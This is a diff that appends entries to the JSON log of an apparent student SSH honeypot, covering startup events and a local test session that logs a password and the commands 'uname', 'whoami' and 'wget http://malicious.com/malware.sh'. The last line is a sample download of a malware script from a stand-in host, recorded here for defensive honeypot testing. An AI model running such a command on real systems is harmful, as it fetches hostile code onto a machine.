@@ -115,3 +115,12 @@
 {"timestamp": "2025-11-28T08:29:38.914975Z", "event": "logger_start", "data": {"msg": "logger initialized, output -> D:\\UPES\\Sem_5\\Minor Project\\Honeyport Project\\Honeypot-Project\\honeypot\\logs\\cowrie.log"}}
 {"timestamp": "2025-11-28T08:29:39.060078Z", "event": "session_event", "data": {"session_id": "startup", "msg": "Creating SSH listener on port 2222"}}
 {"timestamp": "2025-11-28T08:29:39.061484Z", "event": "session_event", "data": {"session_id": "startup", "msg": "Honeypot started on port 2222"}}
+{"timestamp": "2025-12-05T05:03:19.771404Z", "event": "logger_start", "data": {"msg": "logger initialized, output -> D:\\UPES\\Sem_5\\Minor Project\\Honeyport Project\\Honeypot-Project\\honeypot\\logs\\cowrie.log"}}
+{"timestamp": "2025-12-05T05:03:19.899149Z", "event": "session_event", "data": {"session_id": "startup", "msg": "Creating SSH listener on port 2222"}}
+{"timestamp": "2025-12-05T05:03:19.900686Z", "event": "session_event", "data": {"session_id": "startup", "msg": "Honeypot started on port 2222"}}
+{"timestamp": "2025-12-05T05:03:37.858046Z", "event": "session_start", "data": {"session_id": "2d02bf6f-c135-4872-a221-9fddcba82c7a", "username": "N/A", "client_ip": "127.0.0.1"}}
+{"timestamp": "2025-12-05T05:03:40.576013Z", "event": "auth", "data": {"username": "user", "password": "rahulsaini", "client_ip": "127.0.0.1", "method": "password"}}
+{"timestamp": "2025-12-05T05:03:40.584838Z", "event": "session_start", "data": {"session_id": "2d02bf6f-c135-4872-a221-9fddcba82c7a", "username": "user", "client_ip": "127.0.0.1"}}
+{"timestamp": "2025-12-05T05:03:52.603725Z", "event": "session_event", "data": {"session_id": "2d02bf6f-c135-4872-a221-9fddcba82c7a", "cmd": "uname"}}
+{"timestamp": "2025-12-05T05:04:02.500327Z", "event": "session_event", "data": {"session_id": "2d02bf6f-c135-4872-a221-9fddcba82c7a", "cmd": "whoami"}}
+{"timestamp": "2025-12-05T05:04:10.382135Z", "event": "session_event", "data": {"session_id": "2d02bf6f-c135-4872-a221-9fddcba82c7a", "cmd": "wget http://malicious.com/malware.sh"}}
